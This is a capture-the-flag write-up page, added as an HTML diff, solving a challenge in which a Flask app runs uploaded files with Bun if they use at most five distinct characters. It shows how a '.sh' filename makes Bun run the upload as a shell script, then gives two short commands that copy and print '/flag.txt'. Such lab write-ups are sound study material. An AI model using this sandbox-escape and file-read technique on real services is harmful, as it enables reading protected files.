@@ -1,0 +1,355 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href='https://fonts.googleapis.com/css?family=JetBrains Mono' rel='stylesheet'>
+	<link href='/global.css' rel='stylesheet'>
+	<title>five</title>
+  </head>
+  <body class="bg-[url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTElEQVRYha1WWw7DMAjLquYYk7b7H7GTtq9UbWpsQ8fXVh4xJIAfz9f7227IZ9tC3do71bfW2lINPuvW3lP+w2cHgIxHUKZzDhu2yGeZjVAwV6d8EEh4BSw7V6fKvwNwDN37jWId/edYS1TCCqhIfwQ2fg/96QrmDNwyIkDKd+hPAOYgKijKLCt0DszCAKIrUfodQGbgVL9FZywzuqjPWSsie2ULH6HjoCT7kOUbiAI4FWGgYRdkZr4z9ZyxTdsQyR0bmGC1f6PDUIWYXLogCuwcrvzCbej0NRoqTvXUY7XbkA0V9l9t0ss2ZM5uu6kkjnrKB1Bm1fUdAYOUjDlmyov+hwCyC+n4ndEyVTGLEyr9nf0B50C2zJE4I9rmA5XH57wdSEorWSvyETIiNgUjSlWlXxAAU0ZZVRYYpWRD/rWOM7xCEhInuDqM2fwAG58SrpqDi2sAAAAASUVORK5CYII=')] flex flex-col place-items-center min-h-dvh">
+	<div class="flex flex-nowrap flex-row justify-between bg-(--color-background-one) text-(--color-plaintext) font-jetbrains border-b-2 border-(--color-grey-border) w-screen pt-1 sm:text-m cursor-default" id="navbar">
+	<div class="flex flex-row ml-2" id="tabs">
+		<div class="px-4 hover:border-(--color-plaintext) border-(--color-background-one) border-b-2" id="main-tab">
+			Main Page
+		</div>
+		<div class="px-4 hover:border-(--color-plaintext) border-(--color-background-one) border-b-2" id="canvas-tab">
+			Canvas Stuff
+		</div>
+		<div class="px-4 hover:border-(--color-plaintext) border-(--color-background-one) border-b-2" id="about-tab">
+			About
+		</div>
+	</div>
+	<div class="flex-row mr-4 hidden xl:flex" id="status">
+		<div class="px-7"><span class="text-(--color-primarygreen)">/ </span><span id="storage">51</span>%</div>
+		<div class="px-7"><span class="text-(--color-primarygreen)">RAM </span><span id="ram">56</span>%</div>
+		<div class="px-7"><span class="text-(--color-primarygreen)">CPU </span><span id="cpu">27</span>%</div>
+		<div class="px-7"><span class="text-(--color-primarygreen)">eth0 </span><span id="eth">192.168.48.137</span></div>
+		<div class="pl-7"><span class="text-(--color-primarygreen)"><span id="time">19:53</span></span></div>
+	</div>
+</div>
+<script defer>
+	var mainTab = document.getElementById("main-tab");
+	var canvasTab = document.getElementById("canvas-tab");
+	var aboutTab = document.getElementById("about-tab");
+
+	var storageEl = document.getElementById("storage");
+	var ramEl = document.getElementById("ram");
+	var cpuEl = document.getElementById("cpu");
+	var ethEl = document.getElementById("eth");
+	var timeEl = document.getElementById("time");
+
+	var currentLocation = window.location.pathname;
+	var tabSelectedStyle = "border-(--color-primarygreen)";
+	var tabHoveredStyle = "hover:border-(--color-plaintext)"
+	
+	// Handle navigation
+	mainTab.onclick = () => { window.location = "/" };
+	canvasTab.onclick = () => { window.location = "/canvas" };
+	aboutTab.onclick = () => { window.location = "/about" };
+
+	// Handle current tab highlight
+	switch (currentLocation.split("/")[1]) {
+		case "":
+			mainTab.classList.add(tabSelectedStyle);
+			mainTab.classList.remove(tabHoveredStyle);
+			break;
+		case "canvas":
+			canvasTab.classList.add(tabSelectedStyle);
+			canvasTab.classList.remove(tabHoveredStyle);
+			break;
+		case "about":
+			aboutTab.classList.add(tabSelectedStyle);
+			aboutTab.classList.remove(tabHoveredStyle);
+			break;
+	}
+
+	// Handle stat updates
+	var storage = 51;
+	var ram = 56;
+	var cpu = 27;
+
+	var options = {
+		hour: "numeric",
+		minute: "numeric",
+		hour12: false
+	}
+
+	var time = new Intl.DateTimeFormat(undefined, options).format(new Date);
+	timeEl.textContent = time;
+	setInterval(() => {
+		time = new Intl.DateTimeFormat(undefined, options).format(new Date);
+		timeEl.textContent = time;
+		var shouldUpdate = Math.round(Math.random()) == 1;
+		if (shouldUpdate) {
+			ramEl.textContent = Math.min(100, Math.max(0, Number(ramEl.textContent) + Math.round(Math.random())*Math.round(Math.random()*5) * (Math.round(Math.random()) ? -1 : 1)));
+			cpuEl.textContent = Math.min(100, Math.max(0, Number(cpuEl.textContent) + Math.round(Math.random())*Math.round(Math.random()*5) * (Math.round(Math.random()) ? -1 : 1)));
+		}
+	}, 2000)
+
+</script>
+
+
+	<div class="bg-(--color-background-one) box-border my-20 border-1 border-(--color-primarygreen) flex flex-col px-5 pb-5 overflow-x-auto font-jetbrains text-lg max-w-95/100 sm:max-w-70/100">
+		<div class="text-custom-dynamic text-(--color-plaintext)">
+			<h1>The Ark Challenge - five</h1>
+<p>We're given the following files.</p>
+<pre class="language-sh"><code class="language-sh"><span class="token builtin class-name">.</span>
+├── chall
+│   ├── Dockerfile
+│   ├── app.py
+│   ├── flag.txt
+│   ├── requirements.txt
+│   └── sandbox
+└── compose.yaml
+
+<span class="token number">3</span> directories, <span class="token number">5</span> files</code></pre>
+<p>Looking at the Dockerfile, we can see that:</p>
+<ul>
+<li>The flag is at <code>/flag.txt</code>.</li>
+<li>The challenge uses Bun.</li>
+<li>There's a <code>sandbox</code> directory that all users have read, write, and execute permissions over.</li>
+<li>The challenge runs as a user with no special privileges.</li>
+</ul>
+<pre class="language-dockerfile"><code class="language-dockerfile"><span class="token instruction"><span class="token keyword">FROM</span> oven/bun:1.1.27@sha256:0bce8e8f0eb41e131df5529fcce89dc8b97135f4a583fa</span>
+7f28d48cbcdb26ff4e
+
+<span class="token instruction"><span class="token keyword">RUN</span> apt-get update &amp;&amp; apt-get install -yq python3 python3-pip</span>
+
+<span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span>
+
+<span class="token instruction"><span class="token keyword">COPY</span> flag.txt .</span>
+<span class="token instruction"><span class="token keyword">RUN</span> mv flag.txt /</span>
+
+<span class="token instruction"><span class="token keyword">COPY</span> requirements.txt .</span>
+<span class="token instruction"><span class="token keyword">RUN</span> pip3 install -r requirements.txt</span>
+<span class="token instruction"><span class="token keyword">COPY</span> app.py app.py</span>
+
+<span class="token instruction"><span class="token keyword">COPY</span> sandbox sandbox</span>
+<span class="token instruction"><span class="token keyword">RUN</span> chmod 1777 sandbox</span>
+
+<span class="token instruction"><span class="token keyword">USER</span> 404:404</span>
+<span class="token instruction"><span class="token keyword">CMD</span> flask run --host 0.0.0.0 --port 3000</span></code></pre>
+<p>Continuing onto the <code>app.py</code> file, we can see the core of the challenge.</p>
+<pre class="language-python"><code class="language-python"><span class="token comment"># ...snip...</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_request</span>
+<span class="token keyword">def</span> <span class="token function">hook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">"user_dir"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
+        session<span class="token punctuation">[</span><span class="token string">"user_dir"</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"./sandbox"</span><span class="token punctuation">,</span> secrets<span class="token punctuation">.</span>token_hex<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">"user_dir"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+<span class="token comment"># ...snip...</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">"/run"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">"file"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Missing file parameter"</span><span class="token punctuation">,</span> <span class="token number">400</span>
+    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span>
+    filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token keyword">or</span> <span class="token string">""</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># A new JSFxxk challenge!</span>
+    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Too many characters :("</span><span class="token punctuation">,</span> <span class="token number">400</span>
+
+    filepath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">"user_dir"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
+    <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
+            <span class="token punctuation">[</span><span class="token string">"bun"</span><span class="token punctuation">,</span> filepath<span class="token punctuation">]</span><span class="token punctuation">,</span>
+            capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
+            timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>
+        <span class="token punctuation">)</span>
+        <span class="token keyword">if</span> proc<span class="token punctuation">.</span>returncode <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"Result: "</span> <span class="token operator">+</span> proc<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string">"Error"</span>
+    <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>TimeoutExpired<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Timeout"</span></code></pre>
+<p>Initially it looks like we need to write JavaScript to read the flag with only <code>5</code> different characters. At least to my knowledge, we'd typically require at least <code>6</code> characters to do anything useful in vanilla JavaScript. However, there are examples where libraries or other small additions to the language can be leveraged to reduce the number of characters needed. For example, <a href="https://aem1k.com/five/">https://aem1k.com/five/</a>, uses JQuery UI features to execute any JavaScript with only <code>5</code> characters.</p>
+<p>With this in mind, I started looking for features of Bun that might allow us to do something similar. While I didn't find anything particularly useful for this idea, I did stumble across this: <a href="https://bun.com/docs/runtime/shell#sh-file-loader">https://bun.com/docs/runtime/shell#sh-file-loader</a>.</p>
+<blockquote>
+<p>For simple shell scripts, you can use Bun Shell instead of /bin/sh. Pass a file with the .sh extension to bun:</p>
+<pre class="language-sh"><code class="language-sh">bun ./script.sh</code></pre>
+</blockquote>
+<p>We can use this, since the filename we use during the file upload is only sanitised using <a href="https://tedboy.github.io/flask/generated/werkzeug.secure_filename.html">secure_filename</a>, which does not remove or change our file extension.</p>
+<p>With this new approach, we just need to read the flag using at most <code>5</code> different characters in a shell context. Importantly, this also means we have state, since one file upload can rely on the result of the previous. Finding a way to read the flag required a lot of trial and error, but I came up with the below.</p>
+<pre class="language-sh"><code class="language-sh"><span class="token function">cp</span> /* */* <span class="token comment"># UPLOAD 1: cp /flag.txt into current directory. This will be `sandbox/&lt;random-sandbox-folder/`.</span>
+<span class="token function">pr</span> */*/*  <span class="token comment"># UPLOAD 2: read files in */*/*</span></code></pre>
+<p>The <code>pr</code> command was found while looking through <code>/usr/bin</code> in the container for binaries with short names.</p>
+<pre class="language-sh"><code class="language-sh">$ <span class="token function">pr</span> <span class="token parameter variable">--help</span>
+Usage: <span class="token function">pr</span> <span class="token punctuation">[</span>OPTION<span class="token punctuation">]</span><span class="token punctuation">..</span>. <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span><span class="token punctuation">..</span>.
+Paginate or columnate FILE<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">for</span> printing.</code></pre>
+<p>It turned out to be perfect for this challenge, as it simply paginates a file (or files) and prints to stdout.</p>
+<p>Anyway, using this payload, we get the flag.</p>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+<span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">Werkzeug/3.1.8 Python/3.9.2</span></span>
+...snip...
+
+<span class="token header"><span class="token header-name keyword">Result</span><span class="token punctuation">:</span> </span>
+
+2026-09-12 00:59 sandbox/948324bd0af0c6f34ff6c9dbfe3fd98b/flag.txt Page 1
+
+
+IERAE{dummy}
+...snip...</code></pre>
+
+		</div>
+	</div>
+  </body>
+
+
+	<style>
+		/**
+		 * Gruvbox dark theme
+		 *
+		 * Adapted from a theme based on:
+		 * Vim Gruvbox dark Theme (https://github.com/morhetz/gruvbox)
+		 *
+		 * @author Azat S. <to@azat.io>
+		 * @version 1.0
+		 */
+
+		code[class*="language-"],
+		pre[class*="language-"] {
+			color: #ebdbb2; /* fg1 / fg */
+			font-family: Consolas, Monaco, "Andale Mono", monospace;
+			direction: ltr;
+			text-align: left;
+			white-space: pre;
+			word-spacing: normal;
+			word-break: normal;
+			line-height: 1.5;
+
+			-moz-tab-size: 4;
+			-o-tab-size: 4;
+			tab-size: 4;
+
+			-webkit-hyphens: none;
+			-moz-hyphens: none;
+			-ms-hyphens: none;
+			hyphens: none;
+		}
+
+		pre[class*="language-"]::-moz-selection,
+		pre[class*="language-"] ::-moz-selection,
+		code[class*="language-"]::-moz-selection,
+		code[class*="language-"] ::-moz-selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		pre[class*="language-"]::selection,
+		pre[class*="language-"] ::selection,
+		code[class*="language-"]::selection,
+		code[class*="language-"] ::selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		/* Code blocks */
+		pre[class*="language-"] {
+			padding: 1em;
+			margin: 0.5em 0;
+			overflow: auto;
+		}
+		
+		/* APENDER: add wrap */
+		code[class*="language-"] {
+			@media (width > 40rem) {
+				text-wrap-mode: wrap;
+				overflow-wrap: anywhere;
+			}
+		}
+
+		:not(pre) > code[class*="language-"],
+		pre[class*="language-"] {
+			background: #191B1C; /* bg0_h */
+			border: 1px solid #665C54;
+		}
+
+		/* Inline code */
+		:not(pre) > code[class*="language-"] {
+			padding: 0.1em;
+			border-radius: 0.3em;
+		}
+
+		.token.comment,
+		.token.prolog,
+		.token.cdata {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.delimiter,
+		.token.boolean,
+		.token.keyword,
+		.token.selector,
+		.token.important,
+		.token.atrule {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.operator,
+		.token.punctuation,
+		.token.attr-name {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.tag,
+		.token.tag .punctuation,
+		.token.doctype,
+		.token.builtin {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.entity,
+		.token.number,
+		.token.symbol {
+			color: #d3869b; /* purple2 */
+		}
+
+		.token.property,
+		.token.constant,
+		.token.variable {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.string,
+		.token.char {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.attr-value,
+		.token.attr-value .punctuation {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.url {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.function {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.regex {
+			background: oklch(0.8591 0 126.59 / 15.94%); /* green2 */
+		}
+
+		.token.bold {
+			font-weight: bold;
+		}
+
+		.token.italic {
+			font-style: italic;
+		}
+
+		.token.inserted {
+			background: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.deleted {
+			background: #fb4934; /* red2 */
+		}
+	</style>
+</html>
